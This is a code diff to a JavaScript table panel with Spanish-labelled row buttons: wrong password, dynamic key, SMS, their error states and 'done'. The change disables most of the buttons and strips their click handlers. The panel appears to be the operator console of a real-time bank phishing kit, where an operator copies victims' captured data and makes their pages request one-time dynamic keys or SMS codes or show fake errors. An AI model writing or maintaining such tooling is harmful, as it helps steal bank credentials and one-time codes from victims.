@@ -144,46 +144,18 @@ function createRow(row) {
     <td>
       <div class="row-actions">
         <button type="button" class="btn btn--warning" data-action="error-login">Err Clave</button>
-        <button type="button" class="btn btn--ok" data-action="dinamica">Dinámica</button>
-        <button type="button" class="btn btn--ok" data-action="sms">SMS</button>
-        <button type="button" class="btn btn--error" data-action="error-dinamica">Err Dinámica</button>
-        <button type="button" class="btn btn--error" data-action="error-sms">Err SMS</button>
-        <button type="button" class="btn btn--done" data-action="done">Listo</button>
+        <button type="button" class="btn btn--ok" data-action="dinamica" disabled style="opacity: 0.4; cursor: not-allowed;">Dinámica</button>
+        <button type="button" class="btn btn--ok" data-action="sms" disabled style="opacity: 0.4; cursor: not-allowed;">SMS</button>
+        <button type="button" class="btn btn--error" data-action="error-dinamica" disabled style="opacity: 0.4; cursor: not-allowed;">Err Dinámica</button>
+        <button type="button" class="btn btn--error" data-action="error-sms" disabled style="opacity: 0.4; cursor: not-allowed;">Err SMS</button>
+        <button type="button" class="btn btn--done" data-action="done" disabled style="opacity: 0.4; cursor: not-allowed;">Listo</button>
       </div>
     </td>
   `
 
-  tr.querySelector('[data-action="dinamica"]')?.addEventListener('click', () => {
-    const current = rows.get(row.id)
-    if (current?.state === 'waiting-dinamica') {
-      setRowState(row.id, 'waiting', null)
-      return
-    }
-    setRowState(row.id, 'waiting-dinamica', 'dinamica')
-  })
-  tr.querySelector('[data-action="sms"]')?.addEventListener('click', () => {
-    const current = rows.get(row.id)
-    if (current?.state === 'waiting-sms') {
-      setRowState(row.id, 'waiting', null)
-      return
-    }
-    setRowState(row.id, 'waiting-sms', 'sms')
-  })
   tr.querySelector('[data-action="error-login"]')?.addEventListener('click', () => {
     setRowState(row.id, 'error-login', 'error-login')
     playErrorSound()
-  })
-  tr.querySelector('[data-action="error-dinamica"]')?.addEventListener('click', () => {
-    setRowState(row.id, 'error-dinamica', 'error-dinamica')
-    playErrorSound()
-  })
-  tr.querySelector('[data-action="error-sms"]')?.addEventListener('click', () => {
-    setRowState(row.id, 'error-sms', 'error-sms')
-    playErrorSound()
-  })
-  tr.querySelector('[data-action="done"]')?.addEventListener('click', () => {
-    setRowState(row.id, 'done', 'done')
-    playSuccessSound()
   })
 
   tr.querySelectorAll('td.copyable').forEach((td) => {
